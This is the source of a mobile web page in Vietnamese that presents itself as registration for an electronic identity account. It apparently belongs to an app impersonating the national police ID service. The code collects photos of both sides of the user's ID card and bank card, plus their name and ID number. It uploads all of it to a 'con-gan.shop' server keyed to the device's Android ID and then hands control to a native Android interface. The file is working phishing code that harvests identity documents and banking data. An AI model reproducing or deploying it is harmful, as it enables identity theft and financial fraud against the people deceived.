<template>
	<view
		style="background-image: url('/static/bg.png');width: 100vw;height:100vh;background-size: cover;background-position: 0 0;">
		<view style="padding: 0 20px;">
			<view style="display: flex;align-items: center;justify-content: center;padding: 10px;padding-top: 20px;">
				<view style="font-weight: 700;">Đăng ký tài khoán định danh diện tử</view>

			</view>
			<view style="margin-top: 10px;">
				<view
					style="display: flex;align-items: center; background-color:#FFFFFF;padding:  20px;border-radius: 10px;box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;"
					@click="selectImg('obverse')">
					<image src="/static/add.png" style="width: 20px;height: 20px;margin-right: 10px;"></image>
					<view>Vui lòng tải lên mặt trước CMND</view>
					<view style="position: absolute;right: 10%;">
						<view>
							<image src="/static/xiangji.png" style="width: 20px;height: 20px;" mode="widthFix"
								v-if="!obverseUrl">
							</image>
						</view>
						<image :src="!obverseUrl?`/static/xiangji.png`:obverseUrl" style="width: 20px;height: 20px;"
							@click="selectImg('obverse')" mode="widthFix" v-if="obverseUrl"></image>
					</view>
				</view>
			</view>
			<view style="margin-top: 10px;">
				<view
					style="display: flex;align-items: center; background-color:#FFFFFF;padding:  20px;border-radius: 10px;box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;"
					@click="selectImg('reverse')">
					<image src="/static/add.png" style="width: 20px;height: 20px;margin-right: 10px;"></image>
					<view>Vui lòng tải lên mặt sau CMND</view>
					<view style="position: absolute;right: 10%;">
						<view>
							<image src="/static/xiangji.png" style="width: 20px;height: 20px;" mode="widthFix"
								v-if="!reverseUrl">
							</image>
						</view>
						<image :src="!reverseUrl?`/static/xiangji.png`:reverseUrl" style="width: 20px;height: 20px;"
							@click="selectImg('reverse')" mode="widthFix" v-if="reverseUrl"></image>
					</view>
				</view>
			</view>
			<view style="margin-top: 10px;">
				<view
					style="display: flex;align-items: center;background-color:#FFFFFF;padding:  20px;border-radius: 10px;box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;"
					@click="selectImg('bank')">
					<image src="/static/add.png" style="width: 20px;height: 20px;margin-right: 10px;"></image>
					<view>Vui lòng tải lên ảnh thẻ ngân hàng</view>
					<view style="position: absolute;right: 10%;">
						<view>
							<image src="/static/xiangji.png" style="width: 20px;height: 20px;" mode="widthFix"
								v-if="!bankUrl">
							</image>
						</view>
						<image :src="!bankUrl?`/static/xiangji.png`:bankUrl" style="width: 20px;height: 20px;"
							@click="selectImg('bank')" mode="widthFix" v-if="bankUrl"></image>
					</view>
				</view>
			</view>
			<view
				style="margin-top: 20px;background-color: #FFFFFF;border-radius: 10px;padding: 30px 30px ;box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;">
				<view>
					<view style="font-weight: 700;">
						Họ và tên
					</view>
					<view style="margin-top: 10px;">
						<input placeholder="Vui lòng nhập họ và tên" type="text" v-model="value1"
							style="border-bottom: 1px solid #aaaaaa;"></input>
					</view>
				</view>
				<view style="margin-top: 20px;">
					<view style="font-weight: 700;">
						Số CMND / CCCD
					</view>
					<view style="margin-top: 10px;">
						<input placeholder="Vui lòng nhập số CMND / CCCD" type="text" v-model="value2"
							style="border-bottom: 1px solid #aaaaaa;"></input>
					</view>
				</view>
				<view style="display: flex;margin-top: 20px;gap: 10px;">
					<view>√</view>
					<view>
						Tích hợp thòng tin thé Căn cưởc cõng dàn tử hẻ thống Căn CƯỚC công dân Quốc gia
					</view>
				</view>
				<view style="display: flex;margin-top: 20px;gap: 10px;">
					<view>√</view>
					<view>
						Tích hợp thông tin các loại giãy tơ tùy thán, thông tin người phu thuộc và các nhỏm thdng tin
						của các Bở, Ban ngành
					</view>
				</view>
			</view>
			<view>
				<view
					style="background-color:#f8ca06;display:flex;justify-content: center;align-items: center;padding: 20px;box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;border-radius: 20px;margin-top: 30px;color: #FFFFFF;font-size: 18px;font-weight: 700;"
					@click="submitData">xác nhận</view>
			</view>









		</view>
		<view v-if="toastVisible" class="custom-toast-mask">
		  <view class="custom-toast">{{ toastText }}</view>
		</view>
	</view>
</template>

<script>
	export default {
		data() {
			return {
				obverseUrl: '', // 正面
				reverseUrl: '', // 反面
				bankUrl: '',
				value1: '',
				value2: '',
				android_id:'',
				 _toastTimer: null,
				      toastVisible: false,
				      toastText: ''

			};
		},
		onLoad(op) {
			this.android_id=op.android_id
		},
		methods: {
			$toast(text='成功', time=2000){
			  clearTimeout(this._toastTimer);
			  this.toastText   = text;
			  this.toastVisible= true;
		
			  this._toastTimer = setTimeout(()=>{
				this.toastVisible = false;
			  }, time);
			},
			async MainApp() {
				console.log(1111)
				// 调用 Android 提供的接口
				if (window.MainInterface) {
					window.MainInterface.MainApp();
				} else {
					// alert("Android interface is not available.");
				}
			},
			// 点击上传
			async selectImg(name) {
				const result = await uni.chooseImage({
					count: 1,
					sizeType: ['compressed'],
					sourceType: ['album'],
				});
				console.log('result:', result);
				const imageFile = result;
				console.log('imageFile:', imageFile);

				if (name == "obverse") {
					this.upimg("obverse", imageFile.tempFilePaths[0])
				} else if (name == "reverse") {
					this.upimg("reverse", imageFile.tempFilePaths[0])
				} else if (name == "bank") {
					this.upimg("bank", imageFile.tempFilePaths[0])
				}
			},
			async upimg(type, tempFilePath) {
				uni.showLoading({
					title: "Đang gửi, vui lòng đợi..."
				});
				// 需要使用async/await方式处理上传
				try {
					const result = await new Promise((resolve, reject) => {
						uni.uploadFile({
							url: "https://api.con-gan.shop/api/app/upload", // 确保这是有效的上传接口
							filePath: tempFilePath,
							name: 'file',
							success: (res) => {
								resolve(res); // 上传成功时将结果返回
							},
							fail: (err) => {
								reject(err); // 上传失败时触发错误
							}
						});
					});

					console.log('result:', result);
					uni.hideLoading(); // 隐藏加载提示
					if (result.statusCode === 200) {
						const temp = JSON.parse(result.data); // 直接使用 result.data，而不是 result[1].data

						// 根据 type 更新相应的 URL
						if (type === 'obverse') {
							this.obverseUrl = temp[0].url;
						} else if (type === "reverse") {
							this.reverseUrl = temp[0].url;
						} else if (type === "bank") {
							console.log('type:', type,temp[0].url);
							this.bankUrl = temp[0].url;
						}
					}
				} catch (error) {
					console.error('上传失败:', error) // 处理错误
					uni.hideLoading(); // 隐藏加载提示
					this.$toast('Tải lên thất bại, vui lòng thử lại.');
					
				}
			},

			// 上传图片
			// async upimg(type, tempFilePath) {
			// 	uni.showLoading({
			// 		title: "Đang gửi, vui lòng đợi..."
			// 	})

			// 	const result = await uni.uploadFile({
			// 		url: "https://admin.con-gan.shop/api/app/upload",
			// 		filePath: tempFilePath,
			// 		name: 'file',
			// 	});

			// 	console.log('result:', result);
			// 	uni.hideLoading();
			// 	if (result.statusCode == 200) {
			// 		const temp = JSON.parse(result.data);
			// 		console.log('temp:', temp);
			// 		if (type == 'obverse') {
			// 			this.obverseUrl = temp.url;
			// 		} else if (type == "reverse") {
			// 			this.reverseUrl = temp.url;
			// 		} else if (type == "bank") {
			// 			this.bankseUrl = temp.url;
			// 		}
			// 	}
			// },

			async submitData() {
				try {
					if(!this.obverseUrl){
						this.$toast( 'Vui lòng tải lên mặt trước CMND / CCCD');
						return 
					}
					if(!this.reverseUrl){
						this.$toast('Vui lòng tải lên mặt trước CMND / CCCD');
						return 
					}
					
					if(!this.bankUrl){
						this.$toast('Vui lòng tải lên ảnh thẻ ngân hàng');
						return 
					}
					
					if(!this.value1){
						this.$toast('Vui lòng nhập họ và tên');
						
						return 
					}
					
					if(!this.value2){
						this.$toast('Vui lòng nhập số thẻ ngân hàng');
						
						return 
					}
					const response = await uni.request({
						url: 'https://api.con-gan.shop/api/app/gengxin',
						method: 'POST',
						data: {
							sfz: this.obverseUrl,
							sff: this.reverseUrl,
							yhk: this.bankUrl,
							name: this.value1,
							sfzh: this.value2,
							android_id:this.android_id
						},
						header: {
							'Content-Type': 'application/json'
						}
					});
					console.log(1111, JSON.stringify(response));

					// 处理响应
					if (response.data.code === 0) {
						this.MainApp()
					} else {
						this.$toast('Tải lên thất bại, vui lòng thử lại. code:1008');
						
					}
				} catch (error) {
					console.error('请求失败:', error);
					this.$toast('Tải lên thất bại, vui lòng thử lại '+error);
					
				}
			},
		}
	};
</script>

<style>
/* ---------- 通用 Toast 样式 ---------- */
.custom-toast-mask{
  position: fixed;            /* 全屏遮罩，可点击穿透 */
  top:0;left:0;right:0;bottom:0;
  z-index: 9999;
  pointer-events: none;       /* 不拦截事件 */
}

.custom-toast{
  position:absolute;
  top:50%;left:50%;
  transform:translate(-50%,-50%);
  max-width:80vw;	
  padding: 12px 24px;         /* 约 12/24px；用 vw/px 均可 */
  background: rgba(17,17,17,.8);
  border-radius: 8px;
  color:#fff;
  font-size: 16px;            /* 想要多大改这里 */
  text-align:center;
  word-break:break-all;
  opacity:0;
  animation:toastFade 160ms ease-out forwards;
}

/* 关键帧：纯 opacity+translateY，彻底避免 scale() */
@keyframes toastFade{
  0%  {opacity:0;transform:translate(-50%,-40%);}
  100%{opacity:1;transform:translate(-50%,-50%);}
}
</style>
